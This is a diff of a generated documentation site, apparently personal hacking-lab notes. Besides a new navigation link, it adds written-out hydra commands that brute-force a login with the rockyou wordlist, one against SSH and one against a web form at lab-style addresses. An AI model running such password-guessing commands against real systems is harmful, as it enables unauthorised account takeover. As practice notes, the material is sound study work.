@@ -1214,6 +1214,18 @@
   
   
     <li class="md-nav__item">
+      <a href="../../../../fun/games/team/1on1/" class="md-nav__link">
+        Other
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
       <a href="../../../../fun/games/team/zocki/" class="md-nav__link">
         Zocki
       </a>
@@ -3535,8 +3547,11 @@
                 
                 
                 <h1 id="hydra">Hydra</h1>
-<p>SSH PW crack user "user"</p>
+<p>SSH PW Brute Force user "user"</p>
 <div class="highlight"><pre><span></span><code>hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://10.10.112.131
+</code></pre></div>
+<p>Web Form Brute Force:</p>
+<div class="highlight"><pre><span></span><code>hydra -l user -P /usr/share/wordlists/rockyou.txt <span class="m">10</span>.10.233.243 http-post-form <span class="s2">&quot;/login:username=^USER^&amp;password=^PASS^:F=incorrect&quot;</span> -V 
 </code></pre></div>
                 
               
